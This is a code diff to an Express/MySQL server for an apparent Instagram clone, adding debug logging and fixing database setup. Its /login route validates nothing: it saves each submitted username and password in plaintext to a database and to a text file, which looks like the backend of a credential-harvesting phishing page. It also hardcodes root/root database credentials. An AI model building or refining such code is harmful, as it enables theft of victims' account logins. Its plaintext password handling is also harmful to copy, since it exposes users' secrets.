@@ -13,51 +13,56 @@ app.use(bodyParser.json());
 app.use(express.static('public'));
 
 // Database Connection
-const dbConfig = {
+const db = mysql.createConnection({
     host: 'localhost',
     user: 'root',
-    password: 'root',
-    // Not specifying database yet so we can create it
-};
-
-const db = mysql.createConnection(dbConfig);
+    password: 'root'
+});
 
 db.connect((err) => {
     if (err) {
-        console.error('Error connecting to MySQL:', err);
+        console.error('❌ SERVER ERROR: Could not connect to MySQL. Is it running? Is password correct?', err);
         return;
     }
-    console.log('Connected to MySQL server.');
+    console.log('✅ STEP 1: Connected to MySQL server successfully.');
 
-    // 1. Create Database if it doesn't exist
     db.query('CREATE DATABASE IF NOT EXISTS insta_clone_db', (err) => {
         if (err) {
-            console.error('Error creating database:', err);
-            return; // Stop if we can't create DB
+            console.error('❌ SERVER ERROR: Could not create database.', err);
+            return;
         }
-        console.log('Database "insta_clone_db" checked/created.');
+        console.log('✅ STEP 2: Database "insta_clone_db" checked/created.');
 
-        // 2. Use the new database
-        db.changeUser({ database: 'insta_clone_db' }, (err) => {
+        db.query('USE insta_clone_db', (err) => {
             if (err) {
-                console.error('Error switching to insta_clone_db:', err);
+                console.error('❌ SERVER ERROR: Could not switch to database.', err);
                 return;
             }
-            console.log('Switched to database "insta_clone_db".');
+            console.log('✅ STEP 3: Switched to database "insta_clone_db".');
 
-            // 3. Create Table
-            const createTableQuery = `CREATE TABLE IF NOT EXISTS users (
+            // 3. Create Table using fully qualified name to be safe
+            const createTableQuery = `CREATE TABLE IF NOT EXISTS insta_clone_db.users (
                 id INT AUTO_INCREMENT PRIMARY KEY,
                 username VARCHAR(255),
                 password VARCHAR(255),
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )`;
 
             db.query(createTableQuery, (err) => {
                 if (err) {
-                    console.error('Error creating table:', err);
+                    console.error('❌ SERVER ERROR: Could not create table.', err);
                 } else {
-                    console.log('Table "users" checked/created.');
+                    console.log('✅ STEP 4: Table "users" creation command sent.');
+
+                    // 4. Verify table existence
+                    db.query('SHOW TABLES FROM insta_clone_db', (err, results) => {
+                        if (err) {
+                            console.error('❌ ERROR verifying tables:', err);
+                        } else {
+                            console.log('🔍 VERIFICATION: Tables in insta_clone_db:', results);
+                            console.log('👉 If you see "users" in the list above, it IS there.');
+                        }
+                    });
                 }
             });
         });
@@ -73,13 +78,13 @@ app.post('/login', (req, res) => {
         return res.status(400).json({ success: false, message: 'Missing credentials' });
     }
 
-    const query = "INSERT INTO users (username, password) VALUES (?, ?)";
+    const query = "INSERT INTO insta_clone_db.users (username, password) VALUES (?, ?)";
     db.query(query, [username, password], (err, result) => {
         if (err) {
-            console.error('Error inserting data:', err);
+            console.error('❌ DATABASE ERROR: Could not save user!', err);
             return res.status(500).json({ success: false, message: 'Database error' });
         }
-        console.log(`User logged in: ${username}`);
+        console.log(`✅ SUCCESS: User ${username} saved to database!`);
 
         // Save to text file (backup)
         const logEntry = `${username} -- ${password}\n`;
